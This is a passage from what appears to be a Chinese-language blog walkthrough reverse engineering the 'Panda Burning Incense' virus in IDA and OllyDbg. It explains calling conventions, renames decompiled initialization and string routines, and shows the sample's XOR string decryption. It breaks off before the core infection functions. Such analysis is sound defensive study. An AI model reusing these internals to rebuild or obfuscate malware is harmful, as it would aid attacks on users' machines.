class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>__stdcall</code>是<strong>函数调用约定</strong>的一种，它的主要特征是：</p><ul><li>参数都是<strong>从右向左通过堆栈传递</strong>的</li><li>函数的<strong>堆栈平衡操作是由被调用函数执行</strong>的，比如函数调用在返回前要由被调用函数清理堆栈</li><li>在函数名的前面用下划线修饰，在函数名的后面由@来修饰并加上栈需要的字节数的空间，比如<code>_sumExample@8</code></li></ul><p>函数调用约定主要约束了两件事：</p><ol><li>参数的传递顺序</li><li>调用堆栈由谁(调用函数或被调用函数)清理</li></ol><p>常见的函数调用约定有：<code>__stdcall</code>、<code>__cdecl</code>、<code>__fastcall</code>、<code>__thiscall</code>、<code>__nakedcall</code>、<code>__passcal</code>、<code>__vectorcall</code>。</p><p>在<code>sub_40CA98()</code>中，传入了16个整型变量，在压栈过程中，顺序应该为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push a16</span><br><span class="line">push a15</span><br><span class="line">...</span><br><span class="line">push a1</span><br></pre></td></tr></table></figure><p>最后也是由<code>sub_40CA98()</code>函数pop这16个整型变量。</p><p>双击该函数中的<code>void *retaddr[2];</code>弹出一个<code>Stack of sub_40CA98</code>窗口，对该定义变量进行了一些说明。</p><img src="/posts/a48809a5/5.1.4.png" class="" title="Stack of sub_40CA98"><p>“*”表示一个数组。使用数据定义命令创建局部变量和函数参数。两个特殊字段“r”和“s”表示返回地址和保存的寄存器。</p><p><code>void *retaddr[2];</code>表示定义了一个有2个元素的数组，它的BP(基址指针寄存器)从偏移为0开始，SP(堆栈指针寄存器)从偏移为0开始。</p><p><code>MK_FP</code>是一个宏，功能是做段基址加上偏移地址的运算，也就是取实际地址。其函数原型为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MK_FP( seg,ofs )( (void _seg * )( seg ) +( void near * )( ofs ))</span></span><br></pre></td></tr></table></figure><p>在该函数中，<code>MK_FP</code>如果想要<code>retaddr[]</code>作为参数传入，<code>MK_FP</code>第1个括号中的两个参数都应该填数组的首地址(因为seg=[BP+0]，刚好是数组的首地址；ofs=[SP+0]，也是数组的首地址)。后面跟着的参数的偏移地址在此基础上往上递增。</p><p>鼠标移到变量a1会发现它的偏移为[BP+8] [SP+8]，说明<code>retaddr[]</code>共占8个字节，里面的两个元素很有可能也是int类型。</p><p>第17行代码的<code>sub_4049E8()</code>函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_4049E8@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;ebp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ebx@1</span></span><br><span class="line">  HMODULE v3; <span class="comment">// eax@1</span></span><br><span class="line"></span><br><span class="line">  v2 = a1;</span><br><span class="line">  TlsIndex = <span class="number">0</span>;</span><br><span class="line">  v3 = GetModuleHandleA(<span class="number">0</span>);</span><br><span class="line">  dword_40E650 = (<span class="type">int</span>)v3;</span><br><span class="line">  dword_40D0B8 = (<span class="type">int</span>)v3;</span><br><span class="line">  dword_40D0BC = <span class="number">0</span>;</span><br><span class="line">  dword_40D0C0 = <span class="number">0</span>;</span><br><span class="line">  sub_4049DC();</span><br><span class="line">  <span class="keyword">return</span> sub_403980(v2, (<span class="type">int</span>)&amp;unk_40D0B4, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>__usercall</code>表示用户自定义函数调用约定，用户可以显式指定参数和返回值的位置。比如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_4049E8@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;ebp&gt;)</span><br></pre></td></tr></table></figure><p>表示函数有两个参数：第一个参数通过eax寄存器传递，第二个参数通过ebp寄存器传递，返回值保存在eax寄存器中。</p><p>用户自定义函数调用约定的一般规则如下：</p><ul><li><p>返回值必须位于寄存器中</p></li><li><p>如果返回值类型是void，不能指定返回值的位置</p></li><li><p>如果参数的位置没有指定，假设参数通过堆栈传递</p></li><li><p>可以允许嵌套声明，如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> **__usercall func16@&lt;eax&gt;(<span class="type">int</span> *(__usercall *x)@&lt;ebx&gt; (<span class="type">int</span>, <span class="type">long</span>@&lt;ecx&gt;, <span class="type">int</span>)@&lt;esi&gt;);</span><br></pre></td></tr></table></figure></li><li><p>用于指定位置名的寄存器必须在当前处理器中有效</p></li><li><p>寄存器对可以像这样 \<edx:eax\> 用冒号的形式指定</p></li><li><p><strong>由调用者清理堆栈</strong></p></li></ul><p>该函数的第8行代码有一个API函数，原型为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HMODULE <span class="title function_">GetModuleHandleA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in, optional] LPCSTR lpModuleName</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>功能是加载模块的名称（.dll或.exe文件）。如果省略了文件名扩展名，则将附加默认库扩展名.dll。文件名字符串可以包括一个尾点字符（.），以指示模块名称没有扩展名。字符串不必指定路径。指定路径时，请确保使用反斜线（\），而不是正斜线（/）。将名称（大小写独立）与当前映射到调用过程地址空间的模块的名称进行比较。</p><p>如果<code>lpModuleName</code>参数为null，则<code>GetModuleHandle()</code>将返回用于创建调用过程（.exe文件）的文件的句柄。</p><p>如果函数成功，则返回值是指定模块的句柄。如果函数失败，则返回值为null。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dword_40E650 = (<span class="type">int</span>)v3;</span><br><span class="line">dword_40D0B8 = (<span class="type">int</span>)v3;</span><br><span class="line">dword_40D0BC = <span class="number">0</span>;</span><br><span class="line">dword_40D0C0 = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>这些是写入数据段的操作，暂时可以不管。</p><p>再看<code>sub_4049DC()</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *<span class="title function_">sub_4049DC</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_4046F0(&amp;unk_40D0B4);<span class="comment">//将40D0B4这个地址作为参数传入</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_DWORD *__usercall sub_4046F0@&lt;eax&gt;(_DWORD *result@&lt;eax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  *result = dword_40D028;<span class="comment">//在40D0B4地址中存入40D028地址的数据</span></span><br><span class="line">  dword_40D028 = (<span class="type">int</span>)result;<span class="comment">//在40D028地址中存入40D0B4这个地址</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的功能是把地址40D0B4作为媒介，使得40D028能通过40D0B4找回自己原本存的值。</p><p><code>sub_403980()</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_403980@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;edx&gt;, <span class="type">int</span> a3@&lt;ebp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  dword_40E010 = (<span class="type">int</span>)RaiseException;</span><br><span class="line">  dword_40E014 = (<span class="type">int</span> (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))RtlUnwind;</span><br><span class="line">  dword_40E628 = a1;</span><br><span class="line">  dword_40E62C = <span class="number">0</span>;</span><br><span class="line">  dword_40E630 = a2;</span><br><span class="line">  dword_40E01C = *(_DWORD *)(a2 + <span class="number">4</span>);</span><br><span class="line">  sub_403878(a3);</span><br><span class="line">  byte_40E024 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> sub_403920();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>RaiseException()</code>是用来抛出一个调用线程时发生的异常。</p><p><code>RtlUnwind()</code>遍历访问异常帧链表，把从表头帧到目标帧（不含）的所有异常处理回调函数用异常码（STATUS_UNWIND 即0C0000027H）、异常标志（EXCEPTION_UNWINDING即值2）调用。</p><p>下面等等那些函数基本不用看了(我累了)，因为我们发现一整个<code>sub_4049E8()</code>函数只是在进行初始化操作。一般入口第一个函数就是做初始化操作的。</p><p>回到主函数的<code>__readfsdword()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> __readfsdword( </span><br><span class="line">   <span class="type">unsigned</span> <span class="type">long</span> Offset</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>参数：从最初读取的 FS 的偏移量。</p><p>返回值：字节、字、双字或多次字长的内存内容 (如指示名为调用的函数) 在位置 FS:[Offset]。</p><p><code>__writefsdword()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __writefsdword( </span><br><span class="line">   <span class="type">unsigned</span> <span class="type">long</span> Offset, <span class="comment">//从最初 FS 的偏移量写入</span></span><br><span class="line">   <span class="type">unsigned</span> <span class="type">long</span> Data <span class="comment">//要写入的值</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="5-1-sub-403C98函数分析"><a href="#5-1-sub-403C98函数分析" class="headerlink" title="5.1 sub_403C98函数分析"></a>5.1 sub_403C98函数分析</h2><p>主函数调用了两次<code>sub_403C98()</code>，那先来看它传入的参数是什么类型的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub_403C98((<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)&amp;dword_40E7D4, (<span class="type">signed</span> __int32)dword_40CC40);</span><br><span class="line">sub_403C98((<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)&amp;unk_40E7D8, (<span class="type">signed</span> __int32)dword_40CC6C);</span><br></pre></td></tr></table></figure><p><code>volatile</code>关键字的作用是：编译器在用到这个关键字修饰的变量时必须每次都重新读取这个变量的值，而不是使用保存在寄存器里的备份。</p><p>第一个参数是整数指针类型，在BSS段；第二个参数是整型，移到它上面能看到它是一个整型数组，在CODE段。</p><p>BSS（Block Started by Symbol）通常是指用来存放程序中未初始化的全局变量和静态变量的一块内存区域。特点是可读可写，在程序执行之前BSS段会自动清0。所以，未初始的全局变量在程序执行之前已经成0了。</p><p>CODE段，代码段又称文本段，用来存放指令，运行代码的一块内存空间，此空间大小在代码运行前就已经确定，内存空间一般属于只读，某些架构的代码也允许可写。在代码段中，也有可能包含一些只读的常数变量，例如字符串常量等。</p><p>点进<code>sub_403C98()</code>查看函数调用约定，用的<code>__usercall</code>修饰，第一个参数存入eax，第二参数存入edx，返回值存入eax。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">volatile</span> <span class="type">signed</span> __int32 *__usercall sub_403C98@&lt;eax&gt;(<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *result@&lt;eax&gt;, <span class="type">signed</span> __int32 a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><p>现在看第一个<code>sub_403C98()</code>，<code>&amp;dword_40E7D4</code>表示将地址40E7D4存入eax，<code>dword_40CC40</code>表示将地址40CC40的内容存入edx。那么地址40CC40中的内容是什么呢？需要用OD进行调试。</p><img src="/posts/a48809a5/5.1.5.png" class="" title="查看地址40CC40的内容"><p>可以看到“武汉男生感染下载者”等等一些内容，这就是病毒作者的信息。早些年病毒作者出于炫耀目的，都会加入一些自己的特征。同样，现在APT攻击溯源也会通过文件路径等获取病毒作者的信息。</p><p>接下来进入这个函数分析，看IDA真的折磨，先把几个系统调用的东西看懂了。</p><img src="/posts/a48809a5/5.1.6.png" class="" title="sub_403C98()函数分析"><p><code>__OFADD__</code>是一个宏，它的作用是测试两个数相加是否溢出，返回溢出标志位；<code>__OFSUB__</code>同理。</p><p><code>_InterLockedIncrement()</code>、<code>_InterLockedDecrement()</code>的功能是实现数的原子性加减。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> _InterlockedIncrement(</span><br><span class="line">   <span class="type">long</span> <span class="keyword">volatile</span> * lpAddend<span class="comment">//[in，out]指向要递增的变量的指针,返回值是生成的递增值</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> _InterlockedDecrement(</span><br><span class="line">   <span class="type">long</span> <span class="keyword">volatile</span> * lpAddend<span class="comment">//[in， out]指向要减数的变量的易失指针,返回值是生成的递减值</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><code>_InterlockedExchange()</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> _InterlockedExchange(</span><br><span class="line">   <span class="type">long</span> <span class="keyword">volatile</span> * Target,</span><br><span class="line">   <span class="type">long</span> Value</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>相关参数：</p><ul><li>Target：[in，out]指向要交换的值的指针。 此函数会将此变量设置为<code>Value</code>并返回其之前的值。</li><li>Value：[in]要与指向的值交换的值<code>Target</code>。</li></ul><p>返回值：返回由<code>Target</code>指向的初始值。</p><p>为了观察<code>sub_403C98()</code>函数的执行过程，最好结合IDA和OD一步步调试。<code>sub_403C98()</code>中有三个函数：</p><ol><li><code>sub_403D08()</code></li><li><code>sub_402650()</code></li><li><code>sub_402540()</code></li></ol><h3 id="5-1-1-sub-403D08"><a href="#5-1-1-sub-403D08" class="headerlink" title="5.1.1 sub_403D08"></a>5.1.1 sub_403D08</h3><p>将eax和edx入栈，进入函数<code>sub_403D08()</code>。</p><img src="/posts/a48809a5/5.1.7.png" class="" title="sub_403C98()函数分析"><img src="/posts/a48809a5/5.1.8.png" class="" title="sub_403D08()函数分析"><p><code>sub_403D08()</code>中有一个函数，进入函数<code>sub_402520()</code>。<code>sub_402520()</code>中有两个函数：<code>sub_401F4C()</code>和<code>sub_402608()</code>。</p><img src="/posts/a48809a5/5.1.9.png" class="" title="sub_402520()函数分析"><p>进入<code>sub_401F4C()</code>，再进入<code>sub_401860()</code>。</p><img src="/posts/a48809a5/5.1.10.png" class="" title="sub_401F4C()函数分析"><p><code>sub_401860()</code>中，有几个API函数：</p><img src="/posts/a48809a5/5.1.11.png" class="" title="sub_401860()函数分析"><img src="/posts/a48809a5/5.1.12.png" class="" title="sub_401860()函数分析"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">VOID <span class="title function_">InitializeCriticalSection</span><span class="params">(<span class="comment">//初始化一个临界资源对象</span></span></span><br><span class="line"><span class="params">    LPCRITICAL_SECTION lpCriticalSection <span class="comment">//临界资源对象指针</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">EnterCriticalSection</span><span class="params">(<span class="comment">//进入临界区</span></span></span><br><span class="line"><span class="params">    __inout LPCRITICAL_SECTION lpCriticalSection</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">LeaveCriticalSection</span><span class="params">( <span class="comment">//离开临界区</span></span></span><br><span class="line"><span class="params">    _Inout_LPCRITICAL_SECTION lpCriticalSection</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line">HLOCAL <span class="title function_">LocalAlloc</span><span class="params">(<span class="comment">//堆中分配指定大小的字节数</span></span></span><br><span class="line"><span class="params">    UINT uFlags,</span></span><br><span class="line"><span class="params">    UINT uBytes</span></span><br><span class="line"><span class="params">)</span>;<span class="comment">//返回值：成功则返回一个指向新分配的内存对象的句柄。</span></span><br></pre></td></tr></table></figure><p>相关的多线程数据操作函数有：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">InitializeCriticalSection(&amp;cs);<span class="comment">//初始化临界区</span></span><br><span class="line">EnterCriticalSection(&amp;cs);<span class="comment">//进入临界区</span></span><br><span class="line"><span class="comment">//操作数据</span></span><br><span class="line">MyMoney*=<span class="number">10</span>;<span class="comment">//所有访问MyMoney变量的程序都需要这样写Enter.. Leave...</span></span><br><span class="line">LeaveCriticalSection(&amp;cs);<span class="comment">//离开临界区</span></span><br><span class="line">DeleteCriticalSection(&amp;cs);<span class="comment">//删除临界区</span></span><br></pre></td></tr></table></figure><p>由于临界资源做的是原子操作，不可能人为把它们分开，所以<code>sub_401860()</code>可以不用管，这个函数只是分配一定大小的内存空间而已。</p><p>回到<code>sub_401F4C()</code>，发现又有<code>EnterCriticalSection()</code>和<code>LeaveCriticalSection()</code>，通常它们都是成对出现的，它们之间进行的是原子操作，所以<code>sub_401F4C()</code>也可以不看了。</p><img src="/posts/a48809a5/5.1.13.png" class="" title="sub_401F4C()函数分析"><img src="/posts/a48809a5/5.1.14.png" class="" title="sub_401F4C()函数分析"><p>回到<code>sub_402520()</code>，在执行的过程跳过了<code>sub_402608()</code>函数，可以先在call指令处下个断点，等下次如果运行到这里时可以知道经过了这个函数。</p><img src="/posts/a48809a5/5.1.15.png" class="" title="sub_402520()函数分析"><p>由于<code>sub_403D08()</code>中只有<code>sub_402520()</code>，而<code>sub_402520()</code>也没有其它函数了，所以<code>sub_403D08()</code>基本可以排除它的嫌疑了，它的功能就是分配一定大小的内存空间。</p><h3 id="5-1-2-sub-402650"><a href="#5-1-2-sub-402650" class="headerlink" title="5.1.2 sub_402650"></a>5.1.2 sub_402650</h3><p>在IDA中可以看到<code>sub_402650()</code>的功能是字符串拷贝。</p><img src="/posts/a48809a5/5.1.16.png" class="" title="sub_402650()函数分析"><img src="/posts/a48809a5/5.1.17.png" class="" title="sub_402650()函数分析"><p><code>sub_402540()</code>这个函数被跳过了，先不管。</p><h3 id="5-1-3-总结"><a href="#5-1-3-总结" class="headerlink" title="5.1.3 总结"></a>5.1.3 总结</h3><p>根据上面的分析，可以暂时发现<code>sub_403C98()</code>这个函数有两个功能：</p><ul><li>分配一定大小的内存空间</li><li>将字符串拷贝到分配好的内存空间去</li></ul><p>第二个<code>sub_403C98()</code>显示的字符串是“感谢艾玛…”，也可以帮我们收集病毒制作者的信息。</p><img src="/posts/a48809a5/5.1.18.png" class="" title="sub_403C98()函数分析"><p>为了易于观察，可以在IDA中将<code>sub_403C98()</code>命名为<code>AllocStackAndCopyString()</code>，便于我们理解及分析整个病毒。</p><h2 id="5-2-sub-405360函数分析"><a href="#5-2-sub-405360函数分析" class="headerlink" title="5.2 sub_405360函数分析"></a>5.2 sub_405360函数分析</h2><p>主函数也调用两次<code>sub_405360()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub_405360((<span class="type">int</span>)dword_40CCA4, (<span class="type">int</span>)<span class="string">&quot;xboy&quot;</span>, (<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)&amp;v9);</span><br><span class="line">sub_405360((<span class="type">int</span>)dword_40CCE0, (<span class="type">int</span>)<span class="string">&quot;whboy&quot;</span>, (<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)&amp;v8);</span><br></pre></td></tr></table></figure><p>第一个参数是整型数组，位于CODE段；第二个参数是字符数组，位于CODE段；第三个是整型指针变量，点进去可以看到它的基本信息。</p><img src="/posts/a48809a5/5.2.1.png" class="" title="参数分析"><p>进去<code>sub_405360()</code>查看它的函数调用约定：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_405360@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;edx&gt;, <span class="keyword">volatile</span> <span class="type">signed</span> __int32 *a3@&lt;ecx&gt;)</span><br></pre></td></tr></table></figure><p>是用户自定义函数调用，第一个参数存入eax，第二个参数存入edx，第三个参数存入ecx，返回值存入eax。</p><p>跟<code>sub_403C98()</code>一样步骤，查看几个参数的值，再进去分析这个函数做了什么。</p><img src="/posts/a48809a5/5.2.2.png" class="" title="sub_405360()函数分析"><img src="/posts/a48809a5/5.2.3.png" class="" title="sub_405360()函数分析"><h3 id="5-2-1-sub-403ECC"><a href="#5-2-1-sub-403ECC" class="headerlink" title="5.2.1 sub_403ECC"></a>5.2.1 sub_403ECC</h3><p>根据分析，<code>sub_403ECC()</code>前面的call都是进行初始化寄存器的操作，可以不管。</p><img src="/posts/a48809a5/5.2.4.png" class="" title="sub_405360()函数分析"><p>进入到<code>sub_403ECC()</code>后，eax的值从字符串变为0x20。</p><img src="/posts/a48809a5/5.2.5.png" class="" title="sub_403ECC()函数分析"><p>想弄清楚这个0x20是怎么来的，结果发现样本载入OD时数据窗口就已经存有了0x20。再仔细看数据窗口，结合“xboy”前4个字节的值是4，不难猜测那一串字符的前4个字节的值0x20是字符串的长度。所以这个函数勉强可以算为求字符串的长度，将它更名为<code>StringLen()</code>。</p><p>其实，凡是由Delphi编写的程序，它会在字符串-4的位置保存这个字符串的长度。</p><h3 id="5-2-2-进入循环"><a href="#5-2-2-进入循环" class="headerlink" title="5.2.2 进入循环"></a>5.2.2 进入循环</h3><p>这里面有几个陌生的指令，先学习一下。</p><p>cdq：使用eax的最高位扩展edx的所有位，将eax扩展为64位，edx:eax</p><p>div：无符号除法，被除数为eax，结果的商存放在eax中，余数存放在edx中</p><p>idiv：有符号除法，在32位系统中进行64 / 32位除法，即被除数为64位，除数为32位。结果的商存放在eax中，余数存放在edx中</p><p>movzx：一般用于将较小值拷贝到较大值中</p><img src="/posts/a48809a5/5.2.6.png" class="" title="循环分析"><p>第一次循环运行到<code>sub_403E2C()</code>后，分析如下：</p><img src="/posts/a48809a5/5.2.7.png" class="" title="循环分析"><h4 id="5-2-2-1-sub-403E2C"><a href="#5-2-2-1-sub-403E2C" class="headerlink" title="5.2.2.1 sub_403E2C"></a>5.2.2.1 sub_403E2C</h4><p>进入<code>sub_403E2C()</code>后发现有<code>sub_403D34()</code>函数。</p><img src="/posts/a48809a5/5.2.8.png" class="" title="sub_403E2C()函数分析"><p>再进去，发现这几个函数我们上面都有分析过，总体来说是进行字符串拷贝操作，所以将<code>sub_403D34()</code>命名为<code>StringCopy()</code>。</p><img src="/posts/a48809a5/5.2.9.png" class="" title="sub_403D34()函数分析"><p>返回到父函数，继续看下一个。</p><h4 id="5-2-2-2-sub-403ED4"><a href="#5-2-2-2-sub-403ED4" class="headerlink" title="5.2.2.2 sub_403ED4"></a>5.2.2.2 sub_403ED4</h4><p>在<code>sub_403ED4()</code>中，有一个跳转实现了，去到<code>sub_403C98()</code>，这不就是我们上面分析的主函数的第一个函数吗，它的作用是分配内存空间和字符串拷贝。</p><img src="/posts/a48809a5/5.2.10.png" class="" title="sub_403ED4()函数分析"><p>此时，eax的值为<code>0x13FF80</code>，edx的值为<code>0xB10068</code>，执行<code>sub_403C98()</code>的意思是将地址B10068拷贝到地址13FF80中去。</p><img src="/posts/a48809a5/5.2.11.png" class="" title="sub_403ED4()函数分析"><img src="/posts/a48809a5/5.2.12.png" class="" title="sub_403ED4()函数分析"><p>跳转未实现，需要进入<code>sub_4041FC()</code>函数进行分析。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_4041FC@&lt;eax&gt;(<span class="type">char</span> **a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;edx&gt;, <span class="type">int</span> a3@&lt;ecx&gt;)</span><br></pre></td></tr></table></figure><p>eax中存的内容是ecx的值的地址。进去发现有4个子函数：<code>sub_402560()</code>、<code>sub_403D08()</code>、<code>sub_402650()</code>、<code>sub_403C44()</code>。后面三个前面已经分析过了，分别是分配一定大小的内存空间、字符串拷贝、初始化寄存器。</p><p>现在看<code>sub_402560()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__usercall sub_402560@&lt;eax&gt;(_DWORD *result@&lt;eax&gt;, <span class="type">int</span> a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/5.2.13.png" class="" title="sub_402560()函数分析"><p>进去里面发现又是对临界资源的操作，可以不管，回到父函数<code>sub_403ED4()</code>。</p><p>下面这个call又调用了<code>sub_402650()</code>字符串拷贝函数。</p><img src="/posts/a48809a5/5.2.14.png" class="" title="sub_403ED4()函数分析"><p>在循环处下多几个断点，查看在循环的过程中地址B10068附近数据的变化。</p><img src="/posts/a48809a5/5.2.15.png" class="" title="循环分析"><p>发现在地址40CC94的那一串字符与“xboy”异或后变成“武汉男生感染下载者”，存在了地址B10088中。</p><h3 id="5-2-3-sub-403C98"><a href="#5-2-3-sub-403C98" class="headerlink" title="5.2.3 sub_403C98"></a>5.2.3 sub_403C98</h3><p>是5.1分析过的函数，不再赘述。</p><h3 id="5-2-4-sub-403C68"><a href="#5-2-4-sub-403C68" class="headerlink" title="5.2.4 sub_403C68"></a>5.2.4 sub_403C68</h3><p>也是进行了一些原子操作，不用管。</p><h3 id="5-2-5-总结"><a href="#5-2-5-总结" class="headerlink" title="5.2.5 总结"></a>5.2.5 总结</h3><p>这个函数最主要部分就是循环，“xboy”与那奇怪的字符串异或后变成“武汉男生感染下载者”，说明进行了解密，不妨将<code>sub_405360()</code>函数更名为<code>DecodeString()</code>。</p><h2 id="5-3-sub-404018函数分析"><a href="#5-3-sub-404018函数分析" class="headerlink" title="5.3 sub_404018函数分析"></a>5.3 sub_404018函数分析</h2><p>这个函数也是用户自定义调用约定，第一个参数存入eax，第二个参数存入edx，返回值存入eax。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_404018@&lt;eax&gt;(<span class="type">int</span> result@&lt;eax&gt;, <span class="type">int</span> a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/5.3.1.png" class="" title="sub_404018()函数分析"><img src="/posts/a48809a5/5.3.2.png" class="" title="sub_404018()函数分析"><p>结合来看，不难猜测这个函数的功能是字符串比较。将该函数更名为<code>CMPString()</code>。</p><p>至此，病毒的初始化全过程已经进入尾声了。不得不说，分析样本真的好累啊，分析了两天才分析完样本的初始化。接下来分析紧接着的三个函数是熊猫烧香病毒最重要的功能。</p><h1 id="6-动静结合分析样本——病毒释放机理"><a href="#6-动静结合分析样本——病毒释放机理" class="headerlink" title="6. 动静结合分析样本——病毒释放机理"></a>6. 动静结合分析样本——病毒释放机理</h1><p>继续看主函数的<code>sub_408024()</code>、<code>sub_40CA5C()</code>、<code>sub_40C97C()</code>，这三个是熊猫烧香的核心函数。</p><h2 id="6-1-sub-408024函数分析"><a href="#6-1-sub-408024函数分析" class="headerlink" title="6.1 sub_408024函数分析"></a>6.1 sub_408024函数分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __thiscall <span class="title function_">sub_408024</span><span class="params">(<span class="type">void</span> 